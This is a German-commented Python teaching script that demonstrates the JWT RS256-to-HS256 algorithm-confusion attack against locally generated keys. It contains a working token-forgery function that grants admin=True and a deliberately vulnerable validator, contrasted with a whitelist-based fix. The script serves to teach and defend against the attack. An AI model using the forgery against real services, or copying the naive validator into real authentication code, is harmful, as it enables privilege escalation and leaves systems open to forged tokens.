"""Demo: Algorithm-Confusion-Angriff (RS256 ↔ HS256) auf JWT-Validatoren.

Hintergrund: Wenn dein Auth-Server mit RSA (RS256) signiert und du
*ohne* Algorithm-Whitelist validierst, kann ein Angreifer den Header
auf HS256 ändern und deinen ÖFFENTLICHEN RSA-Schlüssel als HMAC-
Geheimnis missbrauchen. Eine schlecht konfigurierte Library akzeptiert
den gefälschten Token, weil sie blind dem `alg`-Header folgt und mit
dem öffentlichen Schlüssel als HMAC-Schlüssel verifiziert — und
genau diesen Schlüssel hat der Angreifer ja, da er öffentlich ist.

Mitigation: explizite Algorithm-Whitelist im Validator
(RFC 8725 §3.2 / §3.5).

Diese Datei ist ein LOKAL laufendes didaktisches Beispiel. Demo-
Schlüssel werden zur Laufzeit erzeugt. Niemals gegen Fremde benutzen.

Setup:
    pip install cryptography

Start:
    python attack_alg_confusion.py
"""
import base64
import hashlib
import hmac
import json

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding


# -- Hilfsfunktionen ---------------------------------------------------

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


# -- Schritt 1: Auth-Server-Setup (RSA-Keys, signiert RS256) -----------

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Public Key in PEM (das wäre öffentlich auf jwks_uri verfügbar):
public_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo,
)


def sign_rs256(payload: dict) -> str:
    header = {"alg": "RS256", "typ": "JWT"}
    h_b64 = b64url(json.dumps(header).encode())
    p_b64 = b64url(json.dumps(payload).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = private_key.sign(
        signing_input,
        padding.PKCS1v15(),
        hashes.SHA256(),
    )
    return f"{h_b64}.{p_b64}.{b64url(sig)}"


# -- Schritt 2: Angreifer fälscht ein HS256-Token mit dem PUBLIC KEY ---

def forge_hs256_with_public_key(payload: dict, public_pem: bytes) -> str:
    """Was der Angreifer tut, wenn er nur den öffentlichen Schlüssel kennt."""
    header = {"alg": "HS256", "typ": "JWT"}
    h_b64 = b64url(json.dumps(header).encode())
    p_b64 = b64url(json.dumps(payload).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()
    # HMAC mit dem öffentlichen Schlüssel als "Geheimnis"
    sig = hmac.new(public_pem, signing_input, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{b64url(sig)}"


# -- Schritt 3: Validatoren ------------------------------------------

def naive_validate(token: str, public_pem_for_rs: bytes) -> dict:
    """Folgt dem Header blind: 'alg=HS256' → HMAC mit PEM-bytes als Key.
    'alg=RS256' → RSA-Verify. Beide mit DEMSELBEN Schlüssel. 🚨"""
    h_b64, p_b64, sig_b64 = token.split(".")
    header = json.loads(b64url_decode(h_b64))
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = b64url_decode(sig_b64)

    if header["alg"] == "HS256":
        expected = hmac.new(public_pem_for_rs, signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(sig, expected):
            return json.loads(b64url_decode(p_b64))
        raise ValueError("HMAC mismatch")
    if header["alg"] == "RS256":
        try:
            public_key_obj = serialization.load_pem_public_key(public_pem_for_rs)
            public_key_obj.verify(sig, signing_input, padding.PKCS1v15(), hashes.SHA256())
            return json.loads(b64url_decode(p_b64))
        except Exception:
            raise ValueError("RSA-Signatur ungültig")
    raise ValueError(f"Unbekannter alg: {header['alg']}")


ALLOWED_ALGS = {"RS256"}


def correct_validate(token: str, public_pem_for_rs: bytes) -> dict:
    """Algorithm-Whitelist VOR allem anderen."""
    h_b64, p_b64, sig_b64 = token.split(".")
    header = json.loads(b64url_decode(h_b64))

    if header["alg"] not in ALLOWED_ALGS:
        raise ValueError(
            f"Algorithm {header['alg']!r} nicht in Whitelist {ALLOWED_ALGS}. Token abgelehnt."
        )

    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = b64url_decode(sig_b64)
    public_key_obj = serialization.load_pem_public_key(public_pem_for_rs)
    public_key_obj.verify(sig, signing_input, padding.PKCS1v15(), hashes.SHA256())
    return json.loads(b64url_decode(p_b64))


# -- Schritt 4: Demo-Lauf --------------------------------------------

if __name__ == "__main__":
    legit_payload = {"sub": "alice", "admin": False}
    legit_token = sign_rs256(legit_payload)

    evil_payload = {"sub": "alice", "admin": True}   # 🚨 Privilegien-Eskalation
    evil_token = forge_hs256_with_public_key(evil_payload, public_pem)

    print("Legitimer Token (RS256, admin=False):")
    print(f"  {legit_token[:80]}...\n")
    print("Gefälschter Token (HS256, admin=True):")
    print(f"  {evil_token[:80]}...\n")

    print("--- naive_validate ---")
    try:
        result = naive_validate(evil_token, public_pem)
        print(f"  AKZEPTIERT 🚨 admin={result.get('admin')}")
    except ValueError as e:
        print(f"  Abgelehnt: {e}")

    print("\n--- correct_validate ---")
    try:
        result = correct_validate(evil_token, public_pem)
        print(f"  AKZEPTIERT (sollte nicht sein!)")
    except ValueError as e:
        print(f"  Abgelehnt ✓: {e}")

    # Sanity: legitimer Token wird vom korrekten Validator akzeptiert
    print("\n--- correct_validate auf legitimem Token ---")
    result = correct_validate(legit_token, public_pem)
    print(f"  Akzeptiert ✓: admin={result.get('admin')}")

    print("\nLehre: Algorithm-Whitelist im Validator blockiert die Confusion")
    print("       komplett. RS256 ↔ HS256 sind verschiedene Algorithmen mit")
    print("       verschiedenen Schlüssel-Semantiken. Niemals dem Header glauben.")
